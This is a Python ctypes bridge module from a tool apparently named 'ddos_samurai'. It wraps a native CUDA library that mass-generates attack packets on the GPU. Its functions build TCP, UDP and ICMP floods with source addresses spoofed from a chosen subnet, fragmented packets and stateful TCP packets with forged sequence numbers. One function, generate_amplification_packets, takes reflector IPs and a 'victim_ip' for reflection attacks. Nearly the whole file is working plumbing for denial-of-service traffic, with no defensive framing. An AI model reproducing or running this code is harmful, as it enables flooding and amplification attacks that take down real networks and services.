"""CUDA C++ backend bridge for ``ddos_samurai.gpu_packet``.

This module keeps API parity with ``gpu_packet_legacy`` and provides an
optional native path via ``libgpu_packet_cuda.so`` C ABI.
"""

from __future__ import annotations

import ctypes
import contextlib
import os
import sys
from pathlib import Path
from typing import Any

import numpy as np

try:
    from . import gpu_packet_legacy as _legacy
    _LEGACY_IMPORT_ERROR: Exception | None = None
except ModuleNotFoundError as exc:
    _LEGACY_IMPORT_ERROR = exc

    class _LegacyShim:
        class GPUPacketError(RuntimeError):
            pass

        class GPUMemoryError(GPUPacketError):
            pass

        cp = np

        def __getattr__(self, name: str):
            raise ModuleNotFoundError(
                "gpu_packet_legacy is unavailable (missing optional CUDA Python "
                f"dependencies): {_LEGACY_IMPORT_ERROR}"
            ) from _LEGACY_IMPORT_ERROR

    _legacy = _LegacyShim()


_LIB_PATH = Path(__file__).with_name("libgpu_packet_cuda.so")
_NATIVE_ENV = "SAMURAI_GPU_PACKET_CUDA_CPP_NATIVE"


def _env_flag(name: str, default: str = "0") -> bool:
    raw = str(os.environ.get(name, default) or default).strip().lower()
    return raw in {"1", "true", "yes", "on"}


_NATIVE_ENABLED = _env_flag(_NATIVE_ENV, "1")


def _load_lib() -> ctypes.CDLL | None:
    if not _LIB_PATH.exists():
        return None
    try:
        lib = ctypes.CDLL(str(_LIB_PATH))
    except Exception:
        return None

    lib.samurai_gpu_packet_generate_packets.argtypes = [
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # target_ip
        ctypes.c_int64,  # target_port
        ctypes.c_char_p,  # protocol
        ctypes.c_int,  # spoof_ip
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int64,  # tcp_flags
        ctypes.c_int,  # has_ethernet
        ctypes.c_int64,  # window
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_packets.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_packets_from_template.argtypes = [
        ctypes.POINTER(ctypes.c_uint8),  # template_bytes
        ctypes.c_size_t,  # template_len
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int,  # spoof_ip
        ctypes.c_int,  # has_ethernet
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.c_int,  # force_global_fallback
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_packets_from_template.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_packets_from_template_pool.argtypes = [
        ctypes.POINTER(ctypes.c_uint8),  # templates_flat
        ctypes.c_size_t,  # templates_flat_len
        ctypes.c_int64,  # packet_size
        ctypes.c_int64,  # num_templates
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # target_ip
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int,  # spoof_ip
        ctypes.c_int64,  # specific_src_port
        ctypes.c_int,  # has_ethernet
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.c_int,  # force_global_fallback
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_packets_from_template_pool.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_stateful_packets.argtypes = [
        ctypes.POINTER(ctypes.c_uint8),  # templates_flat
        ctypes.c_size_t,  # templates_flat_len
        ctypes.c_int64,  # packet_size
        ctypes.c_int64,  # num_templates
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # target_ip
        ctypes.c_int,  # spoof_ip
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int64,  # specific_src_port
        ctypes.c_int,  # has_ethernet
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.POINTER(ctypes.c_uint32),  # seq_list
        ctypes.c_size_t,  # seq_len
        ctypes.POINTER(ctypes.c_uint32),  # ack_list
        ctypes.c_size_t,  # ack_len
        ctypes.POINTER(ctypes.c_uint8),  # state_list
        ctypes.c_size_t,  # state_len
        ctypes.POINTER(ctypes.c_uint32),  # actual_lengths
        ctypes.c_size_t,  # actual_lengths_len
        ctypes.POINTER(ctypes.c_uint16),  # window_sizes
        ctypes.c_size_t,  # window_sizes_len
        ctypes.POINTER(ctypes.c_uint16),  # mss_values
        ctypes.c_size_t,  # mss_values_len
        ctypes.POINTER(ctypes.c_uint8),  # ttls
        ctypes.c_size_t,  # ttls_len
        ctypes.c_int,  # force_global_fallback
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_stateful_packets.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_fragmented_packets.argtypes = [
        ctypes.POINTER(ctypes.c_uint8),  # payload_bytes
        ctypes.c_size_t,  # payload_len
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # target_ip
        ctypes.c_int64,  # target_port
        ctypes.c_char_p,  # protocol
        ctypes.c_int,  # spoof_ip
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int,  # has_ethernet
        ctypes.c_int64,  # frag1_size
        ctypes.c_int64,  # frag2_size
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_fragmented_packets.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_amplification_packets.argtypes = [
        ctypes.POINTER(ctypes.c_uint8),  # template_bytes
        ctypes.c_size_t,  # template_len
        ctypes.POINTER(ctypes.c_char_p),  # reflectors_ips
        ctypes.c_size_t,  # reflectors_count
        ctypes.c_char_p,  # victim_ip
        ctypes.c_int64,  # count
        ctypes.c_int,  # has_ethernet
        ctypes.c_uint64,  # gateway_mac
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_amplification_packets.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_icmp_packets.argtypes = [
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # target_ip
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int,  # spoof_ip
        ctypes.c_int,  # has_ethernet
        ctypes.c_int64,  # icmp_type
        ctypes.c_int64,  # icmp_code
        ctypes.c_int64,  # payload_size
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_icmp_packets.restype = ctypes.c_int

    lib.samurai_gpu_packet_free.argtypes = [ctypes.c_void_p]
    lib.samurai_gpu_packet_free.restype = None

    lib.samurai_gpu_packet_last_error.argtypes = []
    lib.samurai_gpu_packet_last_error.restype = ctypes.c_char_p
    return lib


_LIB = _load_lib()


_SYNC_SYMBOLS = [
    "cp",
    "create_xoroshiro128p_states",
    "template_kernel",
    "pool_kernel",
    "stateful_pool_kernel",
    "create_tcp_packets_kernel_spoof",
    "create_tcp_packets_kernel_nospoof",
    "create_udp_packets_kernel_spoof",
    "create_udp_packets_kernel_nospoof",
    "create_icmp_packets_kernel",
    "create_fragmented_packets_kernel",
    "amplification_kernel_v2",
]


def _safe_legacy_getattr(name: str, default: Any = None):
    try:
        return getattr(_legacy, name)
    except Exception:
        return default


# Preserve original legacy symbol bindings so facade monkeypatching can
# deterministically disable native path even if sync helpers overwrite legacy.
_LEGACY_BASE_SYMBOLS = {
    name: _safe_legacy_getattr(name, None)
    for name in _SYNC_SYMBOLS
}


def _sync_facade_patches_to_legacy() -> None:
    facade = sys.modules.get("ddos_samurai.gpu_packet")
    if facade is None:
        return
    for name in _SYNC_SYMBOLS:
        if hasattr(facade, name):
            try:
                setattr(_legacy, name, getattr(facade, name))
            except Exception:
                pass


@contextlib.contextmanager
def _temporary_synced_legacy_symbols():
    """Temporarily mirror facade monkeypatches onto legacy symbols.

    Tests patch symbols on ``ddos_samurai.gpu_packet``. Legacy calls should
    observe those patches, but mutations must not leak into subsequent tests.
    """
    facade = sys.modules.get("ddos_samurai.gpu_packet")
    if facade is None:
        yield
        return

    previous = {}
    for name in _SYNC_SYMBOLS:
        if not hasattr(facade, name):
            continue
        previous[name] = _safe_legacy_getattr(name, None)
        try:
            setattr(_legacy, name, getattr(facade, name))
        except Exception:
            pass

    try:
        yield
    finally:
        for name, value in previous.items():
            try:
                setattr(_legacy, name, value)
            except Exception:
                pass


def _call_legacy(name: str, *args, **kwargs):
    if _LEGACY_IMPORT_ERROR is not None:
        raise ModuleNotFoundError(
            "Legacy CUDA Python backend is unavailable because optional "
            f"dependencies are missing: {_LEGACY_IMPORT_ERROR}"
        ) from _LEGACY_IMPORT_ERROR
    with _temporary_synced_legacy_symbols():
        return getattr(_legacy, name)(*args, **kwargs)


def _last_error() -> str:
    if _LIB is None:
        return ""
    try:
        raw = _LIB.samurai_gpu_packet_last_error()
    except Exception:
        return ""
    if not raw:
        return ""
    try:
        return raw.decode("utf-8", errors="replace").strip()
    except Exception:
        return str(raw)


def _as_bytes(value: Any, default: str = "") -> bytes:
    if value is None:
        return default.encode("utf-8")
    if isinstance(value, bytes):
        return value
    return str(value).encode("utf-8")


def _copy_host_bytes(out_ptr: ctypes.c_void_p, out_size: int) -> bytes:
    if int(out_size) <= 0:
        return b""
    if not bool(out_ptr):
        raise _legacy.GPUMemoryError("cuda_cpp backend returned null pointer with non-zero size")
    try:
        return ctypes.string_at(out_ptr, int(out_size))
    finally:
        try:
            _LIB.samurai_gpu_packet_free(out_ptr)
        except Exception:
            pass


def _raise_native_error(default_message: str):
    msg = (_last_error() or default_message or "cuda_cpp native call failed").strip()
    lower = msg.lower()
    if any(
        tok in lower
        for tok in (
            "must not",
            "invalid",
            "too small",
            "unaligned",
            "mismatch",
            "same size",
            "exceed",
            "empty",
            "unsupported",
            "must be",
            ">= 0",
        )
    ):
        raise ValueError(msg)
    raise _legacy.GPUPacketError(msg)


def _host_to_device_like(host_bytes: bytes):
    arr = np.frombuffer(host_bytes, dtype=np.uint8).copy()
    try:
        return _legacy.cp.asarray(arr, dtype=_legacy.cp.uint8)
    except Exception:
        return arr


def _flatten_templates(templates_bytes_list):
    if not templates_bytes_list:
        return b"", 0, 0
    normalized = [memoryview(t).tobytes() for t in templates_bytes_list]
    packet_size = len(normalized[0])
    for i, tpl in enumerate(normalized):
        if len(tpl) != packet_size:
            raise ValueError(
                f"All templates must be same size! Template {i} is {len(tpl)} bytes, expected {packet_size}"
            )
    return b"".join(normalized), int(packet_size), int(len(normalized))


def _array_ptr(arr: np.ndarray | None, ptr_type):
    if arr is None or int(arr.size) == 0:
        return None, 0
    return arr.ctypes.data_as(ptr_type), int(arr.size)


def _native_ready() -> bool:
    if _LIB is None or not _NATIVE_ENABLED:
        return False
    # Test doubles (non-ctypes libraries) should not be gated by facade patch checks.
    if not isinstance(_LIB, ctypes.CDLL):
        return True
    facade = sys.modules.get("ddos_samurai.gpu_packet")
    if facade is None:
        return True
    for name in _SYNC_SYMBOLS:
        if not hasattr(facade, name):
            continue
        # Compare against original legacy bindings (not mutable current values)
        # so sync calls done by compatibility helpers do not re-enable native.
        if getattr(facade, name) is not _LEGACY_BASE_SYMBOLS.get(name):
            return False
    return True


def is_available() -> bool:
    return _LIB is not None


def is_native_path_enabled() -> bool:
    return bool(_NATIVE_ENABLED)


def is_native_library_available() -> bool:
    return bool(_LIB is not None)


def is_native_path_active() -> bool:
    return bool(_native_ready())


def init_gpu():
    return _call_legacy("init_gpu")


def generate_packets(
    count,
    target_ip,
    target_port,
    protocol="tcp",
    spoof_ip=True,
    real_src_ip="192.168.1.100",
    tcp_flags=0x02,
    has_ethernet=True,
    window=-1,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
):
    if not _native_ready() or stream is not None:
        return _call_legacy(
            "generate_packets",
            count,
            target_ip,
            target_port,
            protocol=protocol,
            spoof_ip=spoof_ip,
            real_src_ip=real_src_ip,
            tcp_flags=tcp_flags,
            has_ethernet=has_ethernet,
            window=window,
            stream=stream,
            gateway_mac=gateway_mac,
            spoof_subnet=spoof_subnet,
        )

    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)
    rc = _LIB.samurai_gpu_packet_generate_packets(
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(target_ip)),
        ctypes.c_int64(int(target_port)),
        ctypes.c_char_p(_as_bytes(protocol, "tcp")),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int64(int(tcp_flags)),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_int64(int(window)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_packets failed")

    host = _copy_host_bytes(out_ptr, int(out_size.value))
    return _host_to_device_like(host), int(out_packet_size.value)


def generate_packets_from_template(
    template_bytes,
    count,
    real_src_ip="192.168.1.100",
    spoof_ip=True,
    has_ethernet=True,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
    force_global_fallback=False,
):
    if not _native_ready() or stream is not None:
        return _call_legacy(
            "generate_packets_from_template",
            template_bytes,
            count,
            real_src_ip=real_src_ip,
            spoof_ip=spoof_ip,
            has_ethernet=has_ethernet,
            stream=stream,
            gateway_mac=gateway_mac,
            spoof_subnet=spoof_subnet,
            force_global_fallback=force_global_fallback,
        )

    template_view = memoryview(template_bytes).tobytes()
    if not template_view:
        raise ValueError("template_bytes must not be empty")

    tpl_buf = (ctypes.c_uint8 * len(template_view)).from_buffer_copy(template_view)
    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)

    rc = _LIB.samurai_gpu_packet_generate_packets_from_template(
        tpl_buf,
        ctypes.c_size_t(len(template_view)),
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        ctypes.c_int(1 if force_global_fallback else 0),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_packets_from_template failed")

    host = _copy_host_bytes(out_ptr, int(out_size.value))
    return _host_to_device_like(host), int(out_packet_size.value)


def generate_packets_from_template_pool(
    templates_bytes_list,
    count,
    target_ip,
    real_src_ip="192.168.1.100",
    spoof_ip=True,
    specific_src_port=-1,
    has_ethernet=True,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
    force_global_fallback=False,
):
    if not _native_ready() or stream is not None:
        return _call_legacy(
            "generate_packets_from_template_pool",
            templates_bytes_list,
            count,
            target_ip,
            real_src_ip=real_src_ip,
            spoof_ip=spoof_ip,
            specific_src_port=specific_src_port,
            has_ethernet=has_ethernet,
            stream=stream,
            gateway_mac=gateway_mac,
            spoof_subnet=spoof_subnet,
            force_global_fallback=force_global_fallback,
        )

    flat, packet_size, num_templates = _flatten_templates(templates_bytes_list)
    if num_templates == 0:
        return None, 0

    flat_buf = (ctypes.c_uint8 * len(flat)).from_buffer_copy(flat)
    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)

    rc = _LIB.samurai_gpu_packet_generate_packets_from_template_pool(
        flat_buf,
        ctypes.c_size_t(len(flat)),
        ctypes.c_int64(packet_size),
        ctypes.c_int64(num_templates),
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(target_ip)),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_int64(int(specific_src_port)),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        ctypes.c_int(1 if force_global_fallback else 0),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_packets_from_template_pool failed")

    host = _copy_host_bytes(out_ptr, int(out_size.value))
    return _host_to_device_like(host), int(out_packet_size.value)


def generate_fragmented_packets(
    payload_bytes,
    count,
    target_ip,
    target_port,
    protocol="udp",
    spoof_ip=True,
    real_src_ip="192.168.1.100",
    has_ethernet=True,
    frag1_size=1500,
    frag2_size=1500,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
):
    if not _native_ready() or stream is not None:
        return _call_legacy(
            "generate_fragmented_packets",
            payload_bytes,
            count,
            target_ip,
            target_port,
            protocol=protocol,
            spoof_ip=spoof_ip,
            real_src_ip=real_src_ip,
            has_ethernet=has_ethernet,
            frag1_size=frag1_size,
            frag2_size=frag2_size,
            stream=stream,
            gateway_mac=gateway_mac,
            spoof_subnet=spoof_subnet,
        )

    payload_view = memoryview(payload_bytes).tobytes()
    payload_buf = None
    payload_ptr = None
    if payload_view:
        payload_buf = (ctypes.c_uint8 * len(payload_view)).from_buffer_copy(payload_view)
        payload_ptr = payload_buf

    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)
    rc = _LIB.samurai_gpu_packet_generate_fragmented_packets(
        payload_ptr,
        ctypes.c_size_t(len(payload_view)),
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(target_ip)),
        ctypes.c_int64(int(target_port)),
        ctypes.c_char_p(_as_bytes(protocol, "udp")),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_int64(int(frag1_size)),
        ctypes.c_int64(int(frag2_size)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_fragmented_packets failed")

    host = _copy_host_bytes(out_ptr, int(out_size.value))
    return _host_to_device_like(host), int(out_packet_size.value)


def generate_amplification_packets(
    template_bytes,
    reflectors_ips,
    victim_ip,
    count,
    has_ethernet=True,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
):
    if not _native_ready() or stream is not None:
        return _call_legacy(
            "generate_amplification_packets",
            template_bytes,
            reflectors_ips,
            victim_ip,
            count,
            has_ethernet=has_ethernet,
            stream=stream,
            gateway_mac=gateway_mac,
        )

    if not reflectors_ips:
        raise ValueError("reflectors_ips must not be empty")

    template_view = memoryview(template_bytes).tobytes()
    if not template_view:
        raise ValueError("template_bytes must not be empty")
    tpl_buf = (ctypes.c_uint8 * len(template_view)).from_buffer_copy(template_view)

    reflector_bytes = [_as_bytes(ip) for ip in reflectors_ips]
    reflectors_arr = (ctypes.c_char_p * len(reflector_bytes))(*reflector_bytes)

    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)
    rc = _LIB.samurai_gpu_packet_generate_amplification_packets(
        tpl_buf,
        ctypes.c_size_t(len(template_view)),
        reflectors_arr,
        ctypes.c_size_t(len(reflector_bytes)),
        ctypes.c_char_p(_as_bytes(victim_ip)),
        ctypes.c_int64(int(count)),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_amplification_packets failed")

    host = _copy_host_bytes(out_ptr, int(out_size.value))
    return _host_to_device_like(host), int(out_packet_size.value)


def generate_stateful_packets(
    templates_bytes_list,
    count,
    target_ip,
    spoof_ip=True,
    real_src_ip="192.168.1.100",
    specific_src_port=-1,
    has_ethernet=True,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
    seq_list=None,
    ack_list=None,
    state_list=None,
    actual_lengths=None,
    window_sizes=None,
    mss_values=None,
    ttls=None,
    force_global_fallback=False,
):
    if not _native_ready() or stream is not None:
        return _call_legacy(
            "generate_stateful_packets",
            templates_bytes_list,
            count,
            target_ip,
            spoof_ip=spoof_ip,
            real_src_ip=real_src_ip,
            specific_src_port=specific_src_port,
            has_ethernet=has_ethernet,
            stream=stream,
            gateway_mac=gateway_mac,
            spoof_subnet=spoof_subnet,
            seq_list=seq_list,
            ack_list=ack_list,
            state_list=state_list,
            actual_lengths=actual_lengths,
            window_sizes=window_sizes,
            mss_values=mss_values,
            ttls=ttls,
            force_global_fallback=force_global_fallback,
        )

    flat, packet_size, num_templates = _flatten_templates(templates_bytes_list)
    if num_templates == 0:
        return None
    flat_buf = (ctypes.c_uint8 * len(flat)).from_buffer_copy(flat)

    seq_arr = None if seq_list is None else np.asarray(seq_list, dtype=np.uint32).reshape(-1)
    ack_arr = None if ack_list is None else np.asarray(ack_list, dtype=np.uint32).reshape(-1)
    state_arr = None if state_list is None else np.asarray(state_list, dtype=np.uint8).reshape(-1)
    lengths_arr = (
        None if actual_lengths is None else np.asarray(actual_lengths, dtype=np.uint32).reshape(-1)
    )
    wins_arr = None if window_sizes is None else np.asarray(window_sizes, dtype=np.uint16).reshape(-1)
    msss_arr = None if mss_values is None else np.asarray(mss_values, dtype=np.uint16).reshape(-1)
    ttl_arr = None if ttls is None else np.asarray(ttls, dtype=np.uint8).reshape(-1)

    seq_ptr, seq_len = _array_ptr(seq_arr, ctypes.POINTER(ctypes.c_uint32))
    ack_ptr, ack_len = _array_ptr(ack_arr, ctypes.POINTER(ctypes.c_uint32))
    state_ptr, state_len = _array_ptr(state_arr, ctypes.POINTER(ctypes.c_uint8))
    lengths_ptr, lengths_len = _array_ptr(lengths_arr, ctypes.POINTER(ctypes.c_uint32))
    wins_ptr, wins_len = _array_ptr(wins_arr, ctypes.POINTER(ctypes.c_uint16))
    msss_ptr, msss_len = _array_ptr(msss_arr, ctypes.POINTER(ctypes.c_uint16))
    ttl_ptr, ttl_len = _array_ptr(ttl_arr, ctypes.POINTER(ctypes.c_uint8))

    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)
    rc = _LIB.samurai_gpu_packet_generate_stateful_packets(
        flat_buf,
        ctypes.c_size_t(len(flat)),
        ctypes.c_int64(packet_size),
        ctypes.c_int64(num_templates),
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(target_ip)),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int64(int(specific_src_port)),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        seq_ptr,
        ctypes.c_size_t(seq_len),
        ack_ptr,
        ctypes.c_size_t(ack_len),
        state_ptr,
        ctypes.c_size_t(state_len),
        lengths_ptr,
        ctypes.c_size_t(lengths_len),
        wins_ptr,
        ctypes.c_size_t(wins_len),
        msss_ptr,
        ctypes.c_size_t(msss_len),
        ttl_ptr,
        ctypes.c_size_t(ttl_len),
        ctypes.c_int(1 if force_global_fallback else 0),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_stateful_packets failed")

    host = _copy_host_bytes(out_ptr, int(out_size.value))
    return _host_to_device_like(host), int(out_packet_size.value)


def benchmark_template_generation_paths(*args, **kwargs):
    return _call_legacy("benchmark_template_generation_paths", *args, **kwargs)


def generate_icmp_packets(
    count,
    target_ip,
    real_src_ip="192.168.1.100",
    spoof_ip=True,
    has_ethernet=True,
    icmp_type=8,
    icmp_code=0,
    payload_size=56,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
):
    if not _native_ready() or stream is not None:
        return _call_legacy(
            "generate_icmp_packets",
            count,
            target_ip,
            real_src_ip=real_src_ip,
            spoof_ip=spoof_ip,
            has_ethernet=has_ethernet,
            icmp_type=icmp_type,
            icmp_code=icmp_code,
            payload_size=payload_size,
            stream=stream,
            gateway_mac=gateway_mac,
            spoof_subnet=spoof_subnet,
        )

    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)
    rc = _LIB.samurai_gpu_packet_generate_icmp_packets(
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(target_ip)),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_int64(int(icmp_type)),
        ctypes.c_int64(int(icmp_code)),
        ctypes.c_int64(int(payload_size)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_icmp_packets failed")

    host = _copy_host_bytes(out_ptr, int(out_size.value))
    return _host_to_device_like(host), int(out_packet_size.value)


def get_generation_telemetry() -> dict:
    return _call_legacy("get_generation_telemetry")


def reset_generation_telemetry() -> None:
    _call_legacy("reset_generation_telemetry")


def clear_generation_caches() -> None:
    _call_legacy("clear_generation_caches")


def get_memory_pool():
    return _call_legacy("get_memory_pool")


def get_pinned_host_pool():
    return _call_legacy("get_pinned_host_pool")


def configure_pinned_host_pool(*args, **kwargs):
    return _call_legacy("configure_pinned_host_pool", *args, **kwargs)


def copy_gpu_to_host_pinned(*args, **kwargs):
    return _call_legacy("copy_gpu_to_host_pinned", *args, **kwargs)


def get_pool_telemetry() -> dict:
    return _call_legacy("get_pool_telemetry")


def safe_kernel_launch(*args, **kwargs):
    return _call_legacy("safe_kernel_launch", *args, **kwargs)


def check_gpu_available():
    return _call_legacy("check_gpu_available")


def get_gpu_info() -> dict:
    return _call_legacy("get_gpu_info")


def is_gpu_available() -> bool:
    return bool(_call_legacy("is_gpu_available"))
